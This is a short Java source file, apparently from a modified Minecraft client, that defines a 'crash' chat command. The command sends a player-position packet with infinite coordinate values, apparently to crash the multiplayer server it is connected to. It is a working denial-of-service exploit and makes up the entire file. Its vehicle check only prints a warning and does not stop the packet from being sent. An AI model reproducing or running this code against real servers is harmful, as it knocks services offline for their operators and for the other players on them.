package me.ht9.rose.feature.command.commands;

import me.ht9.rose.feature.command.impl.Executable;
import me.ht9.rose.util.Globals;
import me.ht9.rose.util.misc.FontColor;
import net.minecraft.src.Packet11PlayerPosition;

public final class CrashCommand extends Executable implements Globals
{
    @Override
    public void accept(String[] args) {
        if (mc.thePlayer.ridingEntity == null)
        {
            mc.ingameGUI.addChatMessage(FontColor.RED + "You need to be in a vehicle!");
        }
        mc.getSendQueue().addToSendQueue(new Packet11PlayerPosition(Double.POSITIVE_INFINITY, -999.0, -999.0, Double.POSITIVE_INFINITY, false));
    }
}
